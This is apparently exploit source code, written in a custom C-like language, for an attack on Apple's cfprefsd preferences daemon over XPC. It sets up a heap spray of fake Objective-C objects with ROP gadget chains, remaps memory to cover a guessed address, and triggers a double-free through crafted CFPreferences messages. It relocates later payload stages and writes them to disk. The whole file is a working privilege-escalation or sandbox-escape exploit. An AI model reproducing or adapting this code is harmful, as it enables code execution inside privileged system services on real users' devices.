#include "config.h"
#include "config2.h"

extern CFShow;
extern _NSConcreteGlobalBlock;
extern _dispatch_data_destructor_vm_deallocate;
extern _platform_memmove;
extern _platform_memset;
extern access;
extern calloc;
extern close;
extern creat;
extern dispatch_data_create;
extern dispatch_release;
extern dlopen;
extern exit [[noreturn]];
extern free;
extern getpid;
extern mach_task_self_;
extern mach_vm_allocate;
extern mach_vm_remap;
extern malloc;
extern munmap;
extern printf [[regparm = 1]];
extern sel_registerName;
extern sleep;
extern sprintf [[regparm = 2]];
extern usleep;
extern write;
extern xpc_array_append_value;
extern xpc_array_create;
extern xpc_connection_create_mach_service;
extern xpc_connection_resume;
extern xpc_connection_send_barrier;
extern xpc_connection_send_message;
extern xpc_connection_set_event_handler;
extern xpc_data_create_with_dispatch_data;
extern xpc_dictionary_create;
extern xpc_dictionary_set_int64;
extern xpc_dictionary_set_string;
extern xpc_dictionary_set_value;
extern shared_cache_slide = 0; // XXX nasty trick to make our own relocator store the slide here

/////////////// libc ///////////////

#define NULL 0
#define FALSE 0

#define	F_OK		0	/* test for existence of file */

#define XPC_CONNECTION_MACH_SERVICE_PRIVILEGED 2

#define VM_FLAGS_FIXED		0x0000
#define VM_FLAGS_ANYWHERE	0x0001
#define VM_FLAGS_OVERWRITE	0x4000	/* delete any existing mappings first */

#define VM_INHERIT_NONE		2	/* absent from child */

#define RTLD_LAZY	0x1
#define RTLD_NOW	0x2
#define RTLD_LOCAL	0x4
#define RTLD_GLOBAL	0x8

/////////////// config stuff ///////////////

#define FILL_DICT_COUNT 0x100		// number of strings in spray_dict
#define FILL_COUNT 0x1000		// number of spray_dict elements in the array
#define FREE_COUNT 0x2000		// number of legit free in order to increase time window between double-free
#define FILL_SIZE (0xa8 + 24)		// number of bytes in the replacer string (should be same as xpc_dictionary)

#define GUESS_ADDR 0x120011000		// we are targeting this address in remote process
#define GUESS_SHIFT 0x20		// we are placing our fake object at this offset, to avoid zero bytes
#define GUESS_HIGH 0x4142410000000000	// we must trash these bytes to avoid zero bytes (luckily for us, they get shaven off)

#define PAYLOAD_SIZE 0x1000
#define PAYLOAD_COUNT_PER_BLOCK 4
#define PAYLOAD_BLOCKS_PER_MAPPING 256
#define PAYLOAD_MAPPING_COUNT 256

#define block_size PAYLOAD_SIZE * PAYLOAD_COUNT_PER_BLOCK
#define mapping_size block_size * PAYLOAD_BLOCKS_PER_MAPPING

/////////////// begin ///////////////

;// XXX we must fix up the memmove (memmove_lazy must be provided and was already slid by startup code)
*memmove_lazy = _platform_memmove;
[[stack]]munmap(FAKE_SHARED_CACHE_ADDR, FAKE_SHARED_CACHE_SIZE);

printf("slide = 0x%lx\n", shared_cache_slide);

// relocate stage4
// relocations are appended to the real image, starting with 0
// the relocs are parsed backwards, until 0 (inclusive, thus setting stage4[0] = slide)

cur4 = &stage4_end;
do {
    cur4 = cur4 - 8;
    off4 = *cur4;
    ptr4_dst = ptr4_src = &stage4_begin + off4;
    *ptr4_dst = *ptr4_src + shared_cache_slide;
} while (off4); // XXX this construct will add an extra slide to offset=0, but ok
stage4_size = cur4 - &stage4_begin;

// relocate stage3
// relocations are appended to the real image, starting with 0
// the relocs are parsed backwards, until 0 (exclusive, leave stage3[0] intact)

cur3 = &stage3_end;
while (1) {
    cur3 = cur3 - 8;
    if !(off3 = *cur3) {
        break;
    }
    ptr3_dst = ptr3_src = &stage3_begin + off3;
    *ptr3_dst = *ptr3_src + shared_cache_slide;
}
stage3_size = cur3 - &stage3_begin + STAGE3_FAKE_OBJECT_SZ;

// write the relocated stage4 to disk

fd4 = fd4_ = creat(STAGE4_NAME, 420);
write(fd4_, &stage4_begin, stage4_size);
close(fd4);

// XXX make sure we got all the objective-c stuff ready
[[stack=0x2000]]dlopen("/System/Library/Frameworks/Foundation.framework/Foundation", RTLD_LAZY);

/*
pivot_from_10:
f9404940 ldr x0, [x10, #0x90]
f9400008 ldr x8, [x0]
f9406508 ldr x8, [x8, #0xc8]
d63f0100 blr x8

jmp_4args:
a9420408 ldp x8, x1, [x0, #0x20]
a9430c02 ldp x2, x3, [x0, #0x30]
f9400904 ldr x4, [x8, #0x10]
aa0803e0 mov x0, x8
d61f0080 br x4

lea_x0_jmp_x8:
f9400108 ldr x8, [x8]
910023e0 add x0, sp, #8
d63f0100 blr x8
*/

fake_30 = &fake + GUESS_SHIFT + 0x10;
fake_38 = &fake + GUESS_SHIFT + 0x18;
fake_40 = &fake + GUESS_SHIFT + 0x20;
fake_48 = &fake + GUESS_SHIFT + 0x28;
fake_80 = &fake + 0x80;
fake_a0 = &fake + 0x80 + 0x20;
fake_a8 = &fake + 0x80 + 0x28;
fake_b0 = &fake + 0x80 + 0x30;
// fake_b8 = &fake + 0x80 + 0x38;
fake_c8 = &fake + 0xc8;
fake_d0 = &fake + GUESS_SHIFT + 0x20 + 0x90;
fake_e0 = &fake + 0xe0 + 0x00;
fake_f0 = &fake + 0xe0 + 0x10;

#if 0
struct heap_spray {
    void *fake_objc_class_ptr;      // isa ---+
    // ...                          //        |
};                                  //        |
                                    //        |
struct fake {                       // guess  |
    char shift[GUESS_SHIFT];        //        |
    struct fake_objc_class_t {      // <------+
        char pad[16];
        void *cache_buckets_ptr;    // -------+
        uint64_t cache_bucket_mask; // 0      |
    } fake_objc_class;              //        |
    // ...                          //        |
    struct fake_cache_bucket_t {    // <------+
        void *cached_sel;           // sel_registerName("dealloc")
        void *cached_function;      // pc
    } fake_cache_bucket;
};
#endif

*fake_48 = gadget_pivot_from_10;
*fake_d0 = GUESS_ADDR + 0x80;
*fake_80 = GUESS_ADDR;
*fake_c8 = gadget_jmp_4args;

*fake_a0 = GUESS_ADDR + 0xe0;
*fake_a8 = GUESS_ADDR + STAGE3_FAKE_OBJECT_SZ + 8;
*fake_b0 = STAGE3_USEFUL_SIZE;
// *fake_b8 = 0x7a7a7a7a7a7a7a7a;

*fake_f0 = gadget_lea_x0_jmp_x8;
*fake_e0 = _platform_memmove_plus4; // _platform_memmove + 4

*fake_30 = GUESS_ADDR + GUESS_SHIFT + 0x20;
*fake_38 = 0;
*fake_40 = sel_registerName("dealloc");

// Generate a large mapping consisting of many copies of the given data. Note that changes to the
// beginning of the mapping will be reflected to other parts of the mapping, but possibly only if
// the other parts of the mapping are not accessed directly.

// Repeat the payload several times to create a bigger payload block. This helps with the
// remapping process.
payload_block = payload_block_cur = malloc(block_size);

i = PAYLOAD_COUNT_PER_BLOCK;
do {
    _platform_memmove(payload_block_cur, &fake, stage3_size);
    payload_block_cur = payload_block_cur + PAYLOAD_SIZE;
} while (i = i - 1);

// Now create an even larger copy of that payload block by remapping it several times
// consecutively. This object will take up the same amount of memory as the single payload
// block, despite covering a large virtual address range.

// Generate the large mapping.
volatile mapping = 0;
mach_vm_allocate(*mach_task_self_, &mapping, mapping_size, VM_FLAGS_ANYWHERE);

// Re-allocate the first segment of this mapping for the master slice. Not sure if this is
// necessary.
mach_vm_allocate(*mach_task_self_, &mapping, block_size, VM_FLAGS_FIXED + VM_FLAGS_OVERWRITE);

// Copy in the data into the master slice.
_platform_memmove(mapping, payload_block, block_size);

// Now re-map the master slice onto the other slices.
protection = { 0, 0 };
remap_address = mapping;
j = PAYLOAD_BLOCKS_PER_MAPPING;
do {
    mach_vm_remap(*mach_task_self_, &remap_address, block_size, 0, VM_FLAGS_FIXED + VM_FLAGS_OVERWRITE, *mach_task_self_, mapping, FALSE, protection, protection + 8, VM_INHERIT_NONE);
    remap_address = remap_address + block_size;
} while (j = j - 1);

// All set! We should have one big memory object now.
;// XXX free(payload_block);

// Wrap the payload mapping in a dispatch_data_t so that it isn't copied, then wrap that in
// an XPC data object. We leverage the internal DISPATCH_DATA_DESTRUCTOR_VM_DEALLOCATE data
// destructor so that dispatch_data_make_memory_entry() doesn't try to remap the data
// (which would cause us to be killed by Jetsam).
_dispatch_data_create = dispatch_data_create(); // XXX deal with _dispatch_data_create$VARIANT$armv81 specialization
dispatch_data = dispatch_data2 = _dispatch_data_create(mapping, mapping_size, NULL, *_dispatch_data_destructor_vm_deallocate);
map = xpc_data_create_with_dispatch_data(dispatch_data);
dispatch_release(dispatch_data2);

/////////////// build huge_dict ///////////////

huge_dict = huge_dict2 = huge_dict3 = xpc_dictionary_create(NULL, NULL, 0);

volatile arr = xpc_array_create(NULL, 0); // XXX needs to be volatile because the sequence after the loop
spray_dict = xpc_dictionary_create(NULL, NULL, 0); // XXX not need to be volatile, because its protected by the loop auto-stack

key = { 0, 0, 0, 0 };
k = PAYLOAD_MAPPING_COUNT;
do {
    sprintf(key, "%d", k);
    xpc_dictionary_set_value(spray_dict, key, map);
} while (k = k - 1);
xpc_array_append_value(arr, spray_dict);

xpc_dictionary_set_int64(huge_dict2, "CFPreferencesOperation", 5);
xpc_dictionary_set_value(huge_dict3, "CFPreferencesMessages", arr);

/////////////// build repl_dict ///////////////

repl_dict = repl_dict2 = repl_dict3 = xpc_dictionary_create(NULL, NULL, 0);
arr = xpc_array_create(NULL, 0);
spray_dict = xpc_dictionary_create(NULL, NULL, 0);

value = value2 = calloc(1, FILL_SIZE);
_platform_memset(value2, 'Q', FILL_SIZE - 1);
*value = GUESS_HIGH + (GUESS_ADDR + GUESS_SHIFT);

l = FILL_DICT_COUNT;
do {
    sprintf(key, "%d", l);
    xpc_dictionary_set_string(spray_dict, key, value);
} while (l = l - 1);

m = FILL_COUNT;
do {
    xpc_array_append_value(arr, spray_dict);
} while (m = m - 1);

xpc_dictionary_set_int64(repl_dict2, "CFPreferencesOperation", 5);
xpc_dictionary_set_value(repl_dict3, "CFPreferencesMessages", arr);

/////////////// build vuln_dict ///////////////

vuln_dict = vuln_dict2 = vuln_dict3 = xpc_dictionary_create(NULL, NULL, 0);
arr = xpc_array_create(NULL, 0);

arr_free = arr_free_ = xpc_dictionary_create(NULL, NULL, 0);
xpc_dictionary_set_int64(arr_free, "CFPreferencesOperation", 4);
xpc_array_append_value(arr, arr_free_);

n = FREE_COUNT;
do {
    arr_elem1 = xpc_dictionary_create(NULL, NULL, 0);
    xpc_dictionary_set_int64(arr_elem1, "CFPreferencesOperation", 20);
    xpc_array_append_value(arr, arr_elem1);
} while (n = n - 1);

xpc_dictionary_set_int64(vuln_dict2, "CFPreferencesOperation", 5);
xpc_dictionary_set_value(vuln_dict3, "CFPreferencesMessages", arr);

/////////////// trigger ///////////////

retry = 30;
do {
    //printf("run\n");
    volatile conn = [[stack=512]]xpc_connection_create_mach_service("com.apple.cfprefsd.daemon", 0, XPC_CONNECTION_MACH_SERVICE_PRIVILEGED);
    xpc_connection_set_event_handler(conn, { _NSConcreteGlobalBlock, 0x50000000, CFShow, { 0, 0x20, "v16@?0@\"NSObject<OS_xpc_object>\"8", 0 } });
    xpc_connection_resume(conn);

    volatile client = [[stack=512]]xpc_connection_create_mach_service("com.apple.cfprefsd.daemon", 0, XPC_CONNECTION_MACH_SERVICE_PRIVILEGED);
    xpc_connection_set_event_handler(client, { _NSConcreteGlobalBlock, 0x50000000, CFShow, { 0, 0x20, "v16@?0@\"NSObject<OS_xpc_object>\"8", 0 } });
    xpc_connection_resume(client);

    volatile link = [[stack=512]]xpc_connection_create_mach_service("com.apple.cfprefsd.daemon", 0, XPC_CONNECTION_MACH_SERVICE_PRIVILEGED);
    xpc_connection_set_event_handler(link, { _NSConcreteGlobalBlock, 0x50000000, CFShow, { 0, 0x20, "v16@?0@\"NSObject<OS_xpc_object>\"8", 0 } });
    xpc_connection_resume(link);

    sleep(1);
    xpc_connection_send_message(link, huge_dict);
    xpc_connection_send_barrier(link, { _NSConcreteGlobalBlock, 0x50000000, CFShow, { 0, 0x20, "v8@?0", 0 } });
    xpc_connection_send_message(client, repl_dict);
    xpc_connection_send_message(conn, vuln_dict);
    sleep(3);
    if !(access(STAGE4_FLAG, F_OK)) {
        break;
    }
} while (retry = retry - 1);

done:
exit(42);
